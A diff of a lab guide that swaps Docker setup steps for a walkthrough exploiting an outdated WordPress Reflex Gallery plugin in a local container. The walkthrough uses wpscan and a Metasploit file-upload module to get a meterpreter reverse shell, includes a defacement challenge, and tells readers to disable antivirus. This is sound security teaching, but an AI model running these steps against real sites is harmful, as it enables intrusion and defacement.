@@ -1,156 +1,223 @@
-# WordPress vs. Kali Docker Setup
+# WordPress vs. Kali
 
-In order to simplify the installation and configuration of our at-home pentesting lab, CodePath has created and pre-configured Docker containers to help us get set up with a few simple keystrokes.
-> For those of you who don't know, Docker is a service that allows developers to pre-configure packages with all the dependencies needed in order to successfully run a program or service. It runs at the kernel level and allows for extremely fast, light-weight, virtual environments in which you can do a multitude of things such as develop software and, in our case, set up a penetration testing lab for WordPress.
+Now that we have our locally hosted Docker containers up and running, we will begin to explore different ways in which we can experiment with our at-home pentesting lab.
+> Note: Do not try any of this on real applications or WordPress sites. We purposely have the containers configured with outdated versions and plugins simply to demonstrate applications of Kali linux on a web application that we solely host and own. If you do try it in the real world, you are likely picking a fight that you will lose. The right way to go about finding real-world vulnerabilities is to jump on bug bounty programs or work as a penetration tester in an official, protected capacity.
 
-Our Docker containers will include:
-* WordPress vulnerable server (hosted locally)
-* A kali vm as root
-* A mySql Server as a database
+## Milestone 1: Exploitable Plug-in
 
-## Step 1: Getting Docker
+We are going to purposely open an attack surface by installing an out-dated plugin, which is very common in larger websites or apps that require a lot of upkeep. For our lab, we will be installing an older version of a plugin called `Reflex Gallery`.
 
-Docker install links: 
+1. In the WP admin console, go to `Plugins` -> `Add New`
+2. Search for `reflex gallery` and you should see `ReFlex Gallery » WordPress Photo Gallery`
+3. Click on the result but don't install the plugin yet. Look at the Changelog tab for any critical security issues that were 
+4. patched and install the version just before it was patched.
+5. On the right side of the dialog, where it lists the compatibility and installs data, click the `WordPress.org Plugin Page » link`
+6. You'll be taken to the official WP plugin page. Click on the `Development` tab
+7. Click `Advanced View`
+8. Under Previous Versions, download the **3.1.3 zip file**
+9. In the WordPress admin console, go to `Plugins -> Add New -> Upload Plugin`, specify the zip file you downloaded, then click `Install Now`
+10. Go to admin console plugins page, find the plugin, and click `Activate`
 
-* [Windows]
-* [Mac OSX]
+From here, we will require you to actually create a gallery using the plugin and use it on a page. I recommend to create a new page for this and insert your gallery there.
 
-[Windows]: https://docs.docker.com/docker-for-windows/install/
-[Mac OSX]: https://docs.docker.com/docker-for-mac/install/
+## Milestone 2: Reconaissance
 
-> Windows 10 users, you must be running version 19041 or higher. Windows 11 users, you must be running version 21H2 or higher. WSL2 must also be installed to support Docker. For Mac OSX users, you must start up Docker from the CLI.
+Developed by Lockheed Martin, a defense contractor, we will be entering the first step in the [Cyber Kill Chain], recon. Essentially, we are going to try to get our first glimpse into some things that we can exploit. In this case, our outdated Reflex Gallery plugin will be that thing; however, in a real environment, we would not explicitly know this beforehand. 
 
-Once installed you can run `docker --version` to ensure that everything ran correctly and that Docker is on your system.
+This is where our Kali container will come into play, and our familiar friend, `wpscan`. There are a multitude of scanning tools that scan for different things, but `wpscan` is explicitly for WordPress and is why we have chosen this tool in particular. 
 
-<img src="https://github.com/colton-gabertan/SecurityShepherdLabs/blob/week07/dockerinstall.gif">
-
-## Step 2: Getting the Images and Docker Files
-
-Another wonderful thing about Docker is that it heavily supports open source development and people can make their containers available for install and use to the general public. We will be pulling a githup repo that contains all of the necessary Docker files onto our machines. 
-
-From there, all we have to do is spin it up and sit tight for a couple of minutes.
-
-The first thing to do is create a directory in which we can hold all of the files for our lab this week. I've opted to create a codepath folder on my desktop. I recommend doing it this way so nothing gets lost, and we can keep all of our related files together. 
-
-On windows:
-```powershell
-cd $HOME/desktop
-mkdir codepath/kalivswp
-cd wpvskali
-```
-
-In this directory, we can clone the repo like so
-```
-git clone https://github.com/0xrutvij/wpVSkali.git
-```
-
-After doing so, check if all of the files are in our `kalivswp` directory. Cloning the repository will create a new folder named `wpVSkali`. We can check the files with:
-```powershell
-cd wpVSkali
-ls
-```
-
-<img src="https://github.com/colton-gabertan/SecurityShepherdLabs/blob/week07/gitrepo.gif">
-
-## Step 3: Spinning Up The Containers
-
-Before proceeding, within the `wpVSkali` directory, we need to add an additional directory called `wpFolder`. Simply run `mkdir wpFolder`
-
-Now that we have all the files we need to actually build and use our containers, all we need to do is run some Docker commands and let it work its magic for a few minutes. 
-
-In the `wpVSkali` directory, we need to build the containers from the images. Once built, they will be up and running. From there we can verify this.
-> For Mac Users: you must run `DOCKER_BUILDKIT=1 docker-compose build` before proceeding. Windows users can skip this step.
-
-The command to run from here is:
-```powershell
-docker-compose up -d
-```
-<img src="https://github.com/colton-gabertan/SecurityShepherdLabs/blob/week07/dockercompose.gif">
-
-After a couple minutes or less, you should get some success messages confirming that three containers have started:
-![image](https://user-images.githubusercontent.com/66766340/162297211-1a73ffd1-e3d4-4de9-afcd-e31e7217dce9.png)
-
-As a sanity check, run:
-```powershell
-docker ps -a
-```
-You should see three containers up and running, along with their `CONTAINER ID`'s.
-
-![image](https://user-images.githubusercontent.com/66766340/162298552-063dfbd6-32d4-4baa-ba8c-f5743eb619db.png)
-
-Now, for further sanity checking, we must ensure that the container for our WordPress server is up and accessible. To do so, open up your browser and navigate to `http://localhost:8080/`.
-> If localhost does not work try:
-> * `http://0.0.0.0:8080/`
-> * `http://127.0.0.1:8080/`
-
-After clicking the `install` button for WordPress and setting up your admin credentials, you should be able to view your WordPress site that is up and running locally on your very own machine and network. I decided to name mine `hackthisbox`.
-
-![image](https://user-images.githubusercontent.com/66766340/162301129-2bdd61df-9150-495d-b685-049977d1356b.png)
-
-Now that we have our vulnerable site up and running, we will also check our Kali machine and if it can access our WordPress site. Back on the command line, run:
-
-```powershell
-docker exec -it <CONTAINER ID> bash
-```
-> The CONTAINER ID should correspond with the kali box. You can see it from the `docker ps -a` command.
-
-<img src="https://github.com/colton-gabertan/SecurityShepherdLabs/blob/week07/kalicheck.gif">
-
-If you have successfully followed the installation guide to this point, you should have your vulnerable WordPress Server up and running in your browser, and you should be accessing the Kali container from your command line.
-
-The last thing do do for this step is to ensure that our Kali container can communicate with our WordPress server. A neat network troubleshooting tool is `ping`, and we will take advantage of it like so:
+Since from last week, we know that `wpscan` is properly configured and working, we will conduct another scan after having our vulnerable plugin running on the WP container.
 
 ```bash
-ping -c 3 127.0.0.1
+wpscan --url http://localhost:8080/ --random-user-agent --api-token <your api token>
 ```
-> This will send 3 little packets over to our server, and report if they are dropped or recieved. If recieved, we now know that our Kali box can reach our WordPress server.
 
-![image](https://user-images.githubusercontent.com/66766340/162311645-76594e72-4a4e-4c5b-bb73-a0912cd49f57.png)
+If everything is running correctly, and you have the plugin properly configured on your WP container, the output should show that your scan has picked up on the Reflex Gallery vulnerability.
 
-At this point, we now have our home lab set up and ready to be tweaked/ experimented with! Kali comes default with a plethora of tools we will be unleashing on our vulnerable site; however, for the purposes of our lab, we must properly configure `wpscan`.
+```
+[i] Plugin(s) Identified:
 
-## Step 4: Configuring and Using `wpscan`
+[+] reflex-gallery
+ | Location: http://localhost:8080/wp-content/plugins/reflex-gallery/
+ | Last Updated: 2021-03-10T02:38:00.000Z
+ | [!] The version is out of date, the latest version is 3.1.7
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ | Confirmed By: Urls In 404 Page (Passive Detection)
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
+ |     Fixed in: 3.1.4
+ |     References:
+ |      - https://wpscan.com/vulnerability/c2496b8b-72e4-4e63-9d78-33ada3f1c674
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
+ |      - https://www.exploit-db.com/exploits/36374/
+ |      - https://packetstormsecurity.com/files/130845/
+ |      - https://packetstormsecurity.com/files/131515/
+ |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_reflexgallery_file_upload/
+```
 
-In the Kali box, run:
+With this information, we can now step into the next stages of the Cyber Kill Chain. Luckily, this is an introduction to pentesting. So, the next stages are actually automated for us via another handy tool, `Metasploit`. `Metasploit` is commonly used by whitehat penetration testers who have get-out-of-jail free cards. It is a framework that allows for the use of [CVE's], and other handy known exploits, allowing us to tap into literal databases full of them. 
+
+One major disadvantage for a blackhat to use `Metasploit` is that it calls upon already known exploits, which in turn, means that security professionals or services are much more likely to pick up on it. 
+
+## Milestone 3: Metasploit
+
+If you look closely at the `wpscan` output, we can see that Reflex Gallery is vulnerable to `Arbitrary File Upload`, meaning we are going to take a look at what's called a **payload**. 
+
+The term "payload" can be used to refer many different things such as malware, scripts, malicious input, etc. It is what composes step 2 in the Cyber Kill Chain, weaponization, with our payload being the weapon. 
+
+Now the way that `Metasploit` works is it calls upon a database that contains these exploits and payloads, so we will need to spin it up and confirm that our `Metasploit` console has access to it.
+
+To start the db, run:
+```bash
+service postgresql start
+msfdb init
+```
+The expected output should be:
+
+![image](https://user-images.githubusercontent.com/66766340/162883780-2467f3b1-4ce3-4a8e-8409-d4dab89d1013.png)
+
+Now that we have our exploit database up and running, we need to now start up the `Metasploit` console with:
 
 ```bash
-wpscan --version
+msfconsole
 ```
-And your expected output should be:
 
-![image](https://user-images.githubusercontent.com/66766340/162314601-53232bf6-3f29-4037-bee0-1ad86d634134.png)
-> If your current version doesn't match, or if you would like it to be the latest, run `wpscan --update`
+Then move on to sanity check that our console has access to the db with:
 
-One thing to note about `wpscan` specifically is it requries the use of an api token, which in turn, requires that we register and make an account at https://wpscan.com/. Once registered and logged in, you can locate your api token here:
-
-![image](https://user-images.githubusercontent.com/66766340/162316224-28487b7c-b4d5-4111-a000-ae71341e2990.png)
-
-With this token, we can now conduct a scan against our WordPress server. The command is:
 ```bash
-wpscan --url http://127.0.0.1:8080 --api-token <paste your token here>
+msf6 > db_status
 ```
+![image](https://user-images.githubusercontent.com/66766340/162884299-08034a7e-188d-4e68-a021-6822f4675532.png)
 
-<img src="https://github.com/colton-gabertan/SecurityShepherdLabs/blob/week07/wpscandemo.gif">
+With this, `Metasploit` should be properly configured and ready to go; however, before we begin our exploit, we need to take care of a few things in our pentesting environment. So exit the console by running `exit`. 
 
-Observing the output from `wpscan` we can see all of the vulnerabilities that it reports! Since this is a lab, make sure you mess around with your site, adding more and more to the attack surface for `wpscan` to pick up on. Practice by exploiting the vulnerabilities you incorporate and overall, have fun with it!
+---
 
-## Step 5: Cleanup
+On your host machine, especially if it is Windows, there will typically be some sort of antivirus running. We will actually need to disable it in order to run our exploit without it getting in the way.
+> This is actually a good thing to know that out-of-the-box AV can pick up on Metasploit exploits!
 
-Since we will not be running our containers 24/7 we need to know how to shut them off and be able to spin them back up for later use.
+For Windows users, we will need to open up `Windows Security`. Under `Virus & threat protection`, we need to disable `Real-time protection` for the duration of the lab.
 
-We can exit the kali container with:
+![image](https://user-images.githubusercontent.com/66766340/162884714-46f108be-a121-476c-94e3-2eb7cc411b76.png)
+
+With our AV out of the way to prevent the interception of our payload, we will also need to figure out the IP address of our Kali container.
+> The need for this will be explained in-depth later in the manual
+
+To do so, run `ifconfig` in your Kali container and take note of the IP address under the `eth0` section. 
+
+![image](https://user-images.githubusercontent.com/66766340/162885193-438413b3-7ca1-44d1-91b2-1a9ede48d40c.png)
+
+---
+
+## Milestone 4: Pwnage
+
+Now that we have our AV out of the way, and we know our Kali container's IP address, we can restart our console with `msfconsole` and get to the fun part.
+
+Within the console, we now need to `search` the database for a Reflex exploit. This is as simple as running:
+
 ```bash
-exit
+msf6 > search Reflex
 ```
+and it will return the result with the exploit that has been crafted specially for our Reflex Gallery vulnerability.
 
-From here, we need to run:
 ```bash
-docker-compose down
+msf6 > search Reflex
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability
 ```
+Now we need to instruct the console to `use` this exploit by running:
 
-![image](https://user-images.githubusercontent.com/66766340/162323623-fc461ef0-3855-4aab-9668-2fb8486be192.png)
-
-With that, you've shut down your containers; however, spinning them back up is as simple as:
 ```bash
-docker-compose up -d
+msf6 > use 0
 ```
+> We can also do `use exploit/unix/webapp/wp_reflexgallery_file_upload`
+
+With msfconsole now "using" this exploit, we need to configure it so that it runs properly within our environment. We can do so by running:
+
+```bash
+msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > info
+```
+
+and it will present us with the `Basic options:` section. Here is where we will need to make some changes. This requires a bit of networking knowledge, and is why we took note of our kali container's IP address. The variable `RHOST` will be our target, and there is another one called `LHOST`, or "listening host".
+
+A listening post, LP, is what will allow us to open up a reverse shell on the container that is hosting our WordPress site. If you've paid close attention to more information gathered from the `wpscan`, it is getting hosted by an apache server, which is linux. This reverse shell, essentially grants us access to this linux server and all of the information on it i.e. we will have our chance to pwn this box.
+
+For now, let's configure the exploit by setting the `RHOST` variable to our website via:
+
+```bash
+msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > set RHOST 127.0.0.1
+```
+and we will also need to ensure that it is sent through the right port with:
+```bash
+msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > set RPORT 8080
+```
+
+And now to set the LP to our kali container, we need to similarly set the `LHOST` variable via:
+
+```bash
+msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > set LHOST <your Kali IP>
+```
+> The LPORT will be automatically set and opened for you by the exploit
+
+![image](https://user-images.githubusercontent.com/66766340/162887290-28fb29f4-677c-429f-bf2c-dfb1ceea1c2f.png)
+
+Now, we are ready to cruise through to the next steps of the Cyber Kill Chain: Delivery, Exploitation, Installation, and Command and Control. Essentially, we have performed Recon ourselves with `wpscan`, but `Metasploit` has handled every other step from Weaponization all the way to Command and Control for us!
+
+To run the exploit, it is one simple command:
+
+```bash
+msf6 exploit(exploit/unix/webapp/wp_reflexgallery_file_upload) > exploit
+```
+
+After letting our payload run it's magic, we are greeted with the trusty `meterpreter` reverse shell. This is the moment where we stop mashing our keyboards and mutter *"I'm in"*. 
+
+![image](https://user-images.githubusercontent.com/66766340/162887400-88a59fa2-1049-41c8-86e3-31e244c456da.png)
+> Reverse shells in particular are notorious for being unstable and hard to create from scratch with our payloads. Meterpreter is a solution to that problem, offering a stable, very basic shell on the server we have exploited.
+
+In reference to the Cyber Kill Chain, we have breezed all the way to the Command and Control stage, now having access to our WordPress site's server. Now, one thing to note is that this shell is not as beefy and well developed as the ones we are used to when using linux. So you will have to know your way around a terminal a bit to navigate the directory system.
+
+Commands such as `pwd`, and `ls` are your best friends. At this point, you now need to manually complete the last part of the Cyber Kill Chain, Actions on Objective. 
+
+![image](https://user-images.githubusercontent.com/66766340/162889751-4378f9a3-51d3-4a5d-98e5-97130c311975.png)
+
+---
+
+## Challenge: 
+Traverse your website's file system using linux commands and deface some of the text on your homepage. Then, observe your changes on the website by visiting it.
+
+---
+
+## Closing Remarks: Script Kiddie Badge
+
+Essentially, I wanted to introduce you to the basic process of how to conduct a proper penetration test. However, there is much, much more to what we did. A huge amount of the actual Cyber Kill Chain process was covered for us by `Metasploit`, but this is why it is a useful tool in a red team arsenal, as it dramatically speeds up the process, allowing us to produce actual results in a timely fashion. 
+
+At this point in the course, you have become an honorary **Script Kiddie**, which is often a derogatory term in security for "someone who doesn't know what they're doing". However, I'd like you to take that as a challenge to warm up to the depths of the field and acknowledge just how much time and effort is required to excel. 
+
+In the Weaponization stage, we would actually have to write the php script that serves as our payload. This would require knowledge in exploit development, researching Reflex Gallery and basically breaking its code, and knowing how to craft a reverse shell for the server.
+
+In the Delivery stage, we would need to know the network protocols to use, how to modify our payload to have it send the shell back, and manually open up our listening port. And for black hats, they would need to know how to evade Intrusion Detection/ Prevention Systems and how to remain anonymous during the process. 
+
+The Exploitation stage often relies a ton on luck when using custom payloads and this is probably the climax of all of the work at this point in the kill chain. It's the moment of truth to see if all of your research and educated guesses actually pay off and work. 
+
+After exploitation comes Installation, which involves setting up some form of persistance such as malware that serves as a backdoor for the attacker or penetration tester to access the server later on. This would require further development of yet another payload, taking into consideration what antivirus the target may be using, what kinds of security controls they have set up, and how to embed yourself undetected on their system. 
+
+With Command and Control, one would need deep knowledge of the system they have entered. You'd have to know your way around its controls in order to gain Privilege Escalation, allowing you to access more than what a normal user would be able to. This may require an attacker to have to move laterally throughout the network and find even more vulnerabilities that will eventually grant them full administator access.
+
+Then finally, with Actions on Objective, if an attacker were to steal data, they'd need to figure out how to do it without getting caught. Some of the most prominent hacks involve terabytes of data being stolen, and that would be hard to miss if the system had any type of network monitoring. 
+
+Good luck on the rest of the labs, and I hope this encourages you to dive deeper into security and explore your interests outside of what is being taught by this course!
+
+Head on over to the course portal and continue: https://courses.codepath.org/courses/cybersecurity_university/unit/8#!exercises
+
+> I created this guide as an impromptu update to the old one as we switched our environment from virtualization to containerization, which required some finnicky networking stuff! However, the steps moving forward in the official manual can be done with no issues from here. 
+
+[Cyber Kill Chain]: https://www.crowdstrike.com/cybersecurity-101/cyber-kill-chain/
+[CVE's]: https://www.redhat.com/en/topics/security/what-is-cve
